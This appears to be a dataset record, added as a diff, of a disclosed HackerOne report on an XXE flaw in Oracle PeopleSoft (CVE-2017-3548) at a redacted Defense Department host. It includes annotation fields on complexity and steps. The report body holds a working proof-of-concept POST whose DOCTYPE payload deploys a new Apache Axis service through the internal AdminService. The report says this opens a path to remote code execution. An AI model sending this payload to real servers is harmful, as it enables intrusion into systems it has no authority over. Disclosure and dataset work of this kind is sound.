@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "sp1d3rs ",
+  "title": "XXE with RCE potential on the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (CVE-2017-3548)",
+  "content": "\nDescription\nHello. I was able to identify XXE on the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nIt is CVE in Oracle PeopleSoft (CVE-2017-3548)\nPOC\nI determined that instance is available on localhost port 80, so it's possible to access /pspc/services/AdminService via XXE:\nCode 731 Bytes\n1POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Content-Type: application/xml\n4Content-Length: 608\n5\n6<!DOCTYPE a PUBLIC \"-//B/A/EN\" \"http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22h1testservice%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment\">\nwhere h1testservice is test service name I'm trying to create.\nThe result:\nCode 46 Bytes\n1https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pspc/services/h1testservice\n\u2588\u2588\u2588\u2588\u2588\nI created new service on server.\nIt's possible to go further like other researcher did in the #227880 but I don't think that dropping shell is necessary (since it's already proved that we can create our Apache Axis service.\nSuggested fix\nPatch Oracle PeopleSoft instance.\nImpact\nRemote code execution, internal network access.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "XML External Entities (XXE)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1721413860,
+  "report_url": "https://hackerone.com/reports/710654",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a crafted XML POST request to the target endpoint /PSIGW/PeopleSoftServiceListeningConnector with an XXE payload that references the local AdminService."
+    ],
+    [
+      2,
+      "Observe the creation of a new service (h1testservice) at the specified endpoint, confirming the XXE vulnerability and potential for RCE."
+    ]
+  ],
+  "vuln_description": "This vulnerability is an XML External Entity (XXE) injection in Oracle PeopleSoft (CVE-2017-3548) that allows an attacker to create arbitrary Apache Axis services on the server, potentially leading to Remote Code Execution (RCE) and internal network access.",
+  "reason": "The attack involves understanding XXE vulnerabilities, crafting a specific XML payload to interact with the AdminService, and leveraging the Apache Axis service deployment mechanism. While the components (XXE, Axis service deployment) are known, combining them to achieve RCE requires some expertise and knowledge of the target system.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": "227880",
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The XXE vulnerability involves exploiting an XML parsing issue to interact with internal services, which is not directly related to authentication or authorization boundaries crossed by swapping user sessions or resource IDs. The methodology described focuses on AuthN/AuthZ bypasses and IDORs within the same application context, not on XXE or RCE vulnerabilities.",
+    "is_detectable": false
+  }
+}
